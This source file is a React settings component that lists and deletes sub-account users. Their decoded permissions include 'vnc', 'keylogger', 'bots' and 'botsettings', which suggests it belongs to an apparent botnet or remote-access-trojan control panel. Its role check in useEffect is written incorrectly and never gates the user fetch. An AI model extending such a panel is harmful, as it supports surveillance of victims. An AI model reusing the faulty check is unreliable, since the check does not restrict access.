import { useCallback, useState, useMemo, useEffect, useRef } from 'react';
import {
  Button,
  Card,
  CardActions,
  CardContent,
  CardHeader,
  Checkbox,
  Divider,
  FormControlLabel,
  Stack,
  Typography,
  Unstable_Grid2 as Grid
} from '@mui/material';
import { useSession } from 'next-auth/react';
import { UserTable } from './user-table';
import SettingsContext from 'src/settings';
import { applyPagination } from 'src/utils/apply-pagination';
import { useSelection } from 'src/hooks/use-selection';
import { useServerInsertedHTML } from 'next/navigation';
import { checkperms } from 'src/utils/checkperms';
import { Container } from '@mui/system';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faTrashCan } from '@fortawesome/free-solid-svg-icons';

export const SettingsNotifications = () => {
  const useCustomerIds = (customers) => {
    return useMemo(
      () => {
        return customers.map((customer) => customer.username);
      },
      [customers]
    );
  };

  let data = [];
  const [page, setPage] = useState(0);
  const [rowsPerPage, setRowsPerPage] = useState(5);
  const [customers, setCustomers] = useState(applyPagination(data, page, rowsPerPage));
  const customersIds = useCustomerIds(customers);
  const customersSelection = useSelection(customersIds);
  const { data: session, status } = useSession();
  const countRef = useRef(0);

  const handleSubmit = useCallback(
    (event) => {
      event.preventDefault();
    },
    []
  );

  function checkNth(string, n) {
    n = n - 1 
  
    const character = string[n];
  
    if (character === '1') {
      return true;
    } else if (character === '0') {
      return false;
    }
  }

  const handlePageChange = useCallback(
    (event, value) => {
      setPage(value);
      SettingsContext.CurrentPageUsers = value
    },
    []
  );



  const handleRowsPerPageChange = useCallback(
    (event) => {
      setRowsPerPage(event.target.value);
      SettingsContext.RowsPerPageUsers = event.target.value
      SettingsContext.CurrentPageUsers = 0
      setPage(0);
    },
    []
  );

  useEffect(() => {
    if (!SettingsContext.user.role === ("admin" || "coadmin")) {
      return
    }
    users();

  }, []);

  const users = async () => {
      const fetchEmail = async () => {
        const response = await fetch('/api/settings/get-users');
        const data = await response.json();

        if (data.error) {
          console.error(data.error);
          return
        }

        var userdata = [];

        let users = data.users;

        users.forEach((stats) => {
          const {username, role, tag, permissions} = stats;
          
          userdata.push({username, permissions: permissions, role, tag, vnc: checkNth(permissions, 1), logs: checkNth(permissions, 2), overview: checkNth(permissions, 3), bots: checkNth(permissions, 4), actions: checkNth(permissions, 5), keylogger: checkNth(permissions, 6), botsettings: checkNth(permissions, 7)})
        }) 

        setCustomers(applyPagination(userdata, SettingsContext.CurrentPageUsers, SettingsContext.RowsPerPageUsers))
        SettingsContext.CountUsers = userdata.length

      };

      fetchEmail();
  }

  const deleteUser = async (uname) => {
      const response = await fetch('/api/settings/del-users', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          usernames: uname,
        }),
      })
        .then((response) => response.json())
        .then((data) => console.log(data))
        .catch((error) => console.error(error));

        window.location.reload();
      
  }

  return (
    <form onSubmit={handleSubmit}>
      <Card>
        <CardHeader
          subheader="Manage the subaccounts"
          title="Users"
        />
        <Divider />
        <CardContent>
        <UserTable
          count={SettingsContext.CountUsers}
          items={customers}
          onDeselectAll={customersSelection.handleDeselectAll}
          onDeselectOne={customersSelection.handleDeselectOne}
          onPageChange={handlePageChange}
          onRowsPerPageChange={handleRowsPerPageChange}
          onSelectAll={customersSelection.handleSelectAll}
          onSelectOne={customersSelection.handleSelectOne}
          page={page}
          rowsPerPage={rowsPerPage}
          selected={customersSelection.selected}
        />
        </CardContent>
        <Divider />
        <CardActions sx={{ justifyContent: 'flex-end' }}>
          <Button
            disabled={SettingsContext.user.role != "admin"}
            onClick={() => deleteUser(customersSelection.selected)}
            startIcon={(
              <FontAwesomeIcon icon={faTrashCan} />
            )}
            variant="contained"
          >
            Delete Selected
          </Button>
        </CardActions>
      </Card>
    </form>
  );
};
